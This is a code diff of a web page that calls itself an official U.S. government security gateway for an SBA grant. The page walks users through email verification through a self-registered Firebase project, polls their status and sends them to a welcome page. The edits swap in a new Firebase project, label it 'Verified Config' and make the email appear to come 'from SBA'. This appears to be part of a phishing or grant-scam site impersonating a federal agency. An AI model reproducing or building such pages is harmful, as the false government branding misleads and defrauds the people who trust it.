@@ -32,7 +32,7 @@
 <body>
 
     <div class="gov-banner">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;" alt="US Flag">
         OFFICIAL U.S. GOVERNMENT SYSTEM - SECURITY GATEWAY
     </div>
 
@@ -54,9 +54,9 @@
                 <b>Required Steps:</b>
                 <ul style="margin:0; padding-left:15px;">
                     <li>Open your registered email inbox.</li>
-                    <li>Look for <b>"Verify your email for sba-grant-2026"</b></li>
+                    <li>Look for <b>"Verify your email"</b> from SBA.</li>
                     <li>Click the <b>verification link</b> provided.</li>
-                    <li>Return here to access your dashboard.</li>
+                    <li>This page will update automatically once verified.</li>
                 </ul>
             </div>
 
@@ -77,13 +77,14 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, onAuthStateChanged, reload, signOut, sendEmailVerification } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
 
+        // Verified Config for SBA-Portal-2026-F1253
         const firebaseConfig = {
-            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
-            authDomain: "sba-grant-2026.firebaseapp.com",
-            projectId: "sba-grant-2026",
-            storageBucket: "sba-grant-2026.firebasestorage.app",
-            messagingSenderId: "838430821326",
-            appId: "1:838430821326:web:6438deacb334076a64f99f"
+            apiKey: "AIzaSyCq8CgTyNbKVbUm_GItIC7FAvTuNrNspxI",
+            authDomain: "sba-portal-2026-f1253.firebaseapp.com",
+            projectId: "sba-portal-2026-f1253",
+            storageBucket: "sba-portal-2026-f1253.firebasestorage.app",
+            messagingSenderId: "363290267220",
+            appId: "1:363290267220:web:2a3e8601c11be5dd6e27c1"
         };
 
         const app = initializeApp(firebaseConfig);
@@ -93,13 +94,13 @@
         onAuthStateChanged(auth, async (user) => {
             if (!user) { window.location.href = 'index.html'; return; }
 
-            // Check if user is already verified upon landing
+            // If verified, go to welcome page immediately
             if (user.emailVerified) {
                 window.location.href = 'welcome.html';
                 return;
             }
 
-            // Real-time check for verification status
+            // AUTO-CHECK every 3 seconds so user doesn't have to click "refresh"
             const checkInterval = setInterval(async () => {
                 try {
                     await reload(user);
@@ -109,16 +110,15 @@
                         pill.className = "status-pill verified";
                         pill.classList.remove('pulse-text');
                         
-                        // Push to Welcome Memorandum
                         setTimeout(() => { window.location.href = 'welcome.html'; }, 1500);
                     }
                 } catch (e) {
-                    console.error("Auto-reload failed");
+                    console.error("Auto-reload check failed");
                 }
             }, 3000);
         });
 
-        // Resend Verification Email
+        // Resend logic
         let resendCooldown = false;
         document.getElementById('resendBtn').onclick = async (e) => {
             e.preventDefault();
